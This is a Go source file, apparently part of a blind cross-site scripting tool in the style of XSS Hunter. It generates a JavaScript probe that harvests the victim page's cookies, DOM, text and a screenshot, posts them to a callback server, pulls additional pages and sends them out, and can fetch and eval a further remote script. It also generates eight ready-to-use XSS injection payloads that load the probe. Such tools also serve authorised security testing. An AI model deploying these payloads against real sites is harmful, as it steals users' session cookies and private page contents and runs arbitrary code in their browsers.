package xsshunter

import (
	"encoding/json"
	"fmt"
	"strings"
)

// Variant represents a single XSS payload variant.
type Variant struct {
	Name         string `json:"name"`
	Payload      string `json:"payload"`
	InjectionKey string `json:"injectionKey"`
}

// ProbeJS returns the JavaScript probe payload that collects forensic data
// and phones home to the callback server.
func ProbeJS(callbackBaseURL, probeHex string, collectPages []string, chainloadURI string) string {
	base := strings.TrimRight(callbackBaseURL, "/")
	callbackURL := base + "/_xss/callback"
	pageCallbackURL := base + "/_xss/page_callback"
	html2canvasURL := base + "/_xss/html2canvas.min.js"

	pagesJSON := "[]"
	if len(collectPages) > 0 {
		if b, err := json.Marshal(collectPages); err == nil {
			pagesJSON = string(b)
		}
	}

	return fmt.Sprintf(`(function(){try{
var d=document,w=window,n=navigator;
var data={
probeId:"%s",
url:d.URL,
origin:location.origin,
referrer:d.referrer,
userAgent:n.userAgent,
cookies:d.cookie,
pageTitle:d.title,
inIframe:w.self!==w.top,
browserTime:new Date().toISOString(),
dom:"",
screenshot:"",
pageText:"",
injectionKey:""
};
try{
var h=d.documentElement.outerHTML;
if(h&&h.length>512000)h=h.substring(0,512000);
data.dom=h;
}catch(e){}
try{
var bt=d.body;
var pt=bt.outerText||bt.innerText||bt.textContent||"";
if(pt.length>512000)pt=pt.substring(0,512000);
data.pageText=pt;
}catch(e){}
try{
var cs=d.currentScript||d.querySelector('script[src*="/_xss/"]');
if(cs&&cs.src){var fr=cs.src.split('#')[1];if(fr){var kv=fr.match(/ik=([^&]*)/);if(kv)data.injectionKey=decodeURIComponent(kv[1]);}}
}catch(e){}
function afterSend(fireId){
var pages=%s;
var pcb="%s";
if(pages&&pages.length&&fireId){
for(var i=0;i<pages.length;i++){(function(p){
try{
var x2=new XMLHttpRequest();
x2.open("GET",location.origin+p,true);
x2.onload=function(){
try{
var x3=new XMLHttpRequest();
x3.open("POST",pcb,true);
x3.setRequestHeader("Content-Type","application/json");
x3.send(JSON.stringify({fireId:fireId,probeId:data.probeId,url:location.origin+p,html:x2.responseText}));
}catch(e){}
};
x2.send();
}catch(e){}
})(pages[i]);}
}
var cl="%s";
if(cl){try{
var x4=new XMLHttpRequest();
x4.open("GET",cl,true);
x4.onload=function(){try{eval(x4.responseText)}catch(e){}};
x4.send();
}catch(e){}}
}
function send(){
var x=new XMLHttpRequest();
x.open("POST","%s",true);
x.setRequestHeader("Content-Type","application/json");
x.onload=function(){
var fireId="";
try{var r=JSON.parse(x.responseText);fireId=r.id||"";}catch(e){}
afterSend(fireId);
};
x.onerror=function(){afterSend("")};
x.send(JSON.stringify(data));
}
var s=d.createElement("script");
s.src="%s";
s.onload=function(){
try{
html2canvas(d.body||d.documentElement,{useCORS:true,logging:false,width:Math.min(d.documentElement.scrollWidth,1920),height:Math.min(d.documentElement.scrollHeight,4096)}).then(function(c){
data.screenshot=c.toDataURL("image/png",0.7);
send();
}).catch(function(){send()});
}catch(e){send()}
};
s.onerror=function(){send()};
(d.body||d.head||d.documentElement).appendChild(s);
}catch(e){}})();`, probeHex, pagesJSON, pageCallbackURL, chainloadURI, callbackURL, html2canvasURL)
}

// PayloadVariants returns all available XSS payload variants for a given probe URL.
func PayloadVariants(probeURL string) []Variant {
	type vdef struct {
		name string
		key  string
	}

	variants := []vdef{
		{"Script Tag", "st"},
		{"Script Tag (Break Out)", "stb"},
		{"Img Onerror", "ie"},
		{"Img Onerror (Break Out)", "ieb"},
		{"SVG Onload", "sv"},
		{"Input Onfocus", "if"},
		{"Details Ontoggle", "dt"},
		{"JavaScript URI", "ju"},
	}

	var result []Variant
	for _, v := range variants {
		taggedURL := probeURL + "#ik=" + v.key
		loader := fmt.Sprintf("var s=document.createElement('script');s.src='%s';(document.body||document.head||document.documentElement).appendChild(s)", taggedURL)
		loaderEsc := strings.ReplaceAll(loader, "'", "\\'")

		var payload string
		switch v.key {
		case "st":
			payload = fmt.Sprintf(`<script src="%s"></script>`, taggedURL)
		case "stb":
			payload = fmt.Sprintf(`"><script src="%s"></script>`, taggedURL)
		case "ie":
			payload = fmt.Sprintf(`<img src=x onerror="%s">`, loader)
		case "ieb":
			payload = fmt.Sprintf(`"><img src=x onerror="%s">`, loader)
		case "sv":
			payload = fmt.Sprintf(`<svg onload="%s">`, loader)
		case "if":
			payload = fmt.Sprintf(`<input onfocus="%s" autofocus>`, loader)
		case "dt":
			payload = fmt.Sprintf(`<details open ontoggle="%s">`, loader)
		case "ju":
			payload = fmt.Sprintf(`javascript:eval('%s')`, loaderEsc)
		}

		result = append(result, Variant{
			Name:         v.name,
			Payload:      payload,
			InjectionKey: v.key,
		})
	}
	return result
}
